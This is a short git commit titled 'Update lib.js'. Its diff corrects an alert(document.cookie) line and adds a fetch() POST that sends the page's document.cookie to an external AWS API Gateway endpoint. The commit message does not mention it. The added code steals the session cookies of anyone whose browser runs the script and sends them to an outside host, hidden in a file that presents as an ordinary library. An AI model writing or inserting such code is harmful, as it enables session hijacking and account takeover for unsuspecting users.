c088ca7eceb5dfbc7aa04f7084e899a738a3d1bf
gasbildung <124586300+gasbildung@users.noreply.github.com>
2023-10-07 17:00:56 +0100

    Update lib.js

--- lib.js
+++ lib.js
@@ -1,2 +1,9 @@
-alert(document.cookies)
+alert(document.cookie)
 console.log(1)
+fetch('https://xtzm981uvg.execute-api.us-east-1.amazonaws.com/default/invoke',{
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(document.cookie)
+})
